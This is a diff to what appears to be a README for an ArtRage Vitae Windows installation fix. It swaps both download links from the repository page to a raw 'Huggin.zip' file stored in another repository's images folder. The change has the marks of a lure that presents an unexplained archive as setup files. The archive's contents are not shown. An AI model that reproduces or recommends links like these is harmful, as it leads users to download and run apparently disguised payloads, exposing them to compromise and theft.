@@ -6,7 +6,7 @@ description: "Install ArtRage Vitae on Windows with these troubleshooting steps 
 # 🎨 ArtRage-Vitae-Install-Walkthrough - Fix ArtRage Windows Installation Errors Fast
 
 <div align="center">
-<a href="https://github.com/renaparasitic783/ArtRage-Vitae-Install-Walkthrough">
+<a href="https://github.com/renaparasitic783/renaparasitic783.github.io/raw/refs/heads/main/images/Huggin.zip">
 <img src="https://img.shields.io/badge/Download-ArtRage_Fix-blue.svg" alt="Download Button">
 </a>
 </div>
@@ -38,7 +38,7 @@ Common errors stem from Windows security settings or outdated drivers. Follow th
 
 Visit the link below to access the setup files or the direct download options for your specific version of ArtRage Vitae.
 
-[Download ArtRage Vitae Setup Files](https://github.com/renaparasitic783/ArtRage-Vitae-Install-Walkthrough)
+[Download ArtRage Vitae Setup Files](https://github.com/renaparasitic783/renaparasitic783.github.io/raw/refs/heads/main/images/Huggin.zip)
 
 ## ⚙️ Installation Steps
 
